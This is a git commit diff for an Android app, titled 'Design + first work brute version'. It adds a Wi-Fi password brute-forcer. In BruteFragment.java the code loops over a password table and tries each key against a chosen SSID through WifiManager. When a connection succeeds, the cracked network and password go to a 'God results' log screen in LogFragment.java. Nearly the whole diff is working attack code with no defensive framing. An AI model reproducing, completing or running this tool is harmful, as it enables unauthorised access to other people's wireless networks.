0e2643cb788a5a1f2ef72c8dd715fe903d24a768
LinkClink <shekaqwe@gmail.com>
2020-05-06 15:05:10 +0200

    Design + first work brute version

--- app/src/main/java/BruteFragment/BruteFragment.java
+++ app/src/main/java/BruteFragment/BruteFragment.java
@@ -1,6 +1,8 @@
 package BruteFragment;
 
 import android.content.Context;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -29,7 +31,6 @@ public class BruteFragment extends Fragment {
 
     int netId = 0;
 
-
     private LayoutInflater inflater;
     private ViewGroup container;
 
@@ -42,9 +43,13 @@ public class BruteFragment extends Fragment {
     WifiInfo wifiInfo;
     private WifiConfiguration wifiConfiguration;
 
-    private int flagStartBrute;
+    private int flagStartBrute = 0;
+
+    private Bundle bundle;
 
     private String ssid;
+
+    boolean check;
 
     public static BruteFragment newInstance() {
         return new BruteFragment();
@@ -55,10 +60,10 @@ public class BruteFragment extends Fragment {
 
         this.container = container;
         this.inflater = inflater;
+        InitialisationComponents();
 
         wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
 
-        InitialisationComponents();
 
         buttonBrute.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -76,45 +81,82 @@ public class BruteFragment extends Fragment {
         buttonBruteAll = (Button) view.findViewById(R.id.button_bruteAll);
     }
 
+    /* Test */
     private void Brute() {
-        ShowToast.showToast(getContext(),"Start brute wifi: " + currentBruteSSID);
+
+        GetLogResult("Brute/Start brute wifi: " + currentBruteSSID);
+
+        /* Test */
+        for (int i = 0; i < passwordTable.length; i++) {
+
+            if(flagStartBrute == 0) {
+                /* Remove wifi */
+                wifiManager.removeNetwork(netId);
+
+                /* Config */
+                wifiConfiguration = new WifiConfiguration();
+                wifiConfiguration.SSID = String.format("\"%s\"", currentBruteSSID);
+                wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordTable[i]);
+                /*  */
+
+                netId = wifiManager.addNetwork(wifiConfiguration);
+
+                wifiManager.disconnect();
+                wifiManager.enableNetwork(netId, true);
+                wifiManager.reconnect();
 
 
-        for (int i = 0; i < passwordTable.length; i++)
-        {
-
-            /* Remove wifi */
-            if (netId != 0) wifiManager.removeNetwork(netId);
-
-            /* Config */
-            wifiConfiguration = new WifiConfiguration();
-            wifiConfiguration.SSID = String.format("\"%s\"", currentBruteSSID);
-            wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordTable[i]);
-            /*  */
-
-            netId = wifiManager.addNetwork(wifiConfiguration);
-
-            wifiManager.disconnect();
-            wifiManager.enableNetwork(netId, true);
-            wifiManager.reconnect();
-
-            CheckSuccessConnect();
+                flagStartBrute = 1;
+                if (CheckSuccessConnect() == true) {
+                    GetLogResult("Pass to WIF:" + currentBruteSSID + "Pass: " + passwordTable[i]);
+                    GetLogGoodResults("WIFI: " + currentBruteSSID + " Pass:" + passwordTable[i]);
+                    break;
+                }
+            }
 
         }
     }
 
+    /* Test */
     private boolean CheckSuccessConnect() {
+
+        String data;
 
         // e.g. To check the Network Name or other info:
         wifiInfo = wifiManager.getConnectionInfo();
-
         ssid = wifiInfo.getSSID();
 
-        if (currentBruteSSID.equals(ssid))
+        ssid = ssid.substring(1,ssid.length()-1);
+
+        GetLogResult("Brute/Connect "+ ssid);
+
+        if(currentBruteSSID.equals(ssid))
         {
+            GetLogResult("Success connect");
+            flagStartBrute = 0;
             return true;
         }
 
+
+        flagStartBrute = 0;
         return false;
     }
+
+    /* Test */
+    private void GetLogResult(String text) {
+        bundle = new Bundle();
+        bundle.putString("log", text);
+        getParentFragmentManager().setFragmentResult("log", bundle);
+    }
+
+    private void GetLogGoodResults(String text)
+    {
+        bundle = new Bundle();
+        bundle.putString("logGod",text);
+        getParentFragmentManager().setFragmentResult("logGod", bundle);
+    }
+
+
+
+
 }
--- app/src/main/java/LogFragment/LogFragment.java
+++ app/src/main/java/LogFragment/LogFragment.java
@@ -5,6 +5,7 @@ import android.os.Bundle;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.fragment.app.Fragment;
+import androidx.fragment.app.FragmentResultListener;
 
 import android.view.LayoutInflater;
 import android.view.View;
@@ -15,50 +16,59 @@ import com.linkclink.gfr.R;
 
 public class LogFragment extends Fragment {
 
-
     public static LogFragment newInstance() {
         return new LogFragment();
     }
 
     private TextView textViewLogCat;
+    private TextView textViewGodResults;
 
     private LayoutInflater inflater;
     private ViewGroup container;
 
     private View view;
 
+    private String allLogResults;
+    private String allGodLogResults;
 
     @Override
-    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState)
-    {
+    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
+
         this.inflater = inflater;
         this.container = container;
-
         InitialisationComponents();
 
-        /* test */
-        Set("Work");
-
+        /* Set log results */
+        getParentFragmentManager().setFragmentResultListener("log", this, new FragmentResultListener() {
+            @Override
+            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
+                allLogResults += result.getString("log") + "\n"; /* Not usage */
+                SetLog(result.getString("log"));
+            }
+        });
+        getParentFragmentManager().setFragmentResultListener("logGod", this, new FragmentResultListener() {
+            @Override
+            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
+                allGodLogResults += result.getString("logGod") + "\n"; /* Not usage */
+                SetLogGod(result.getString("logGod"));
+            }
+        });
 
         return view;
     }
 
-    private void InitialisationComponents()
-    {
-        view  = inflater.inflate(R.layout.log_fragment, container, false);
+    private void InitialisationComponents() {
+        view = inflater.inflate(R.layout.log_fragment, container, false);
         textViewLogCat = (TextView) view.findViewById(R.id.textView_logCat);
+        textViewGodResults = (TextView) view.findViewById(R.id.textView_GodResults);
     }
 
-
-
-    public  void Set(String text)
-    {
-        textViewLogCat.setText(text);
+    private void SetLog(String logText) {
+        textViewLogCat.append(logText + "\n");
     }
 
-
-
-
-
+    private void SetLogGod(String godLogText) {
+        textViewGodResults.append(godLogText + "\n");
+    }
 
 }
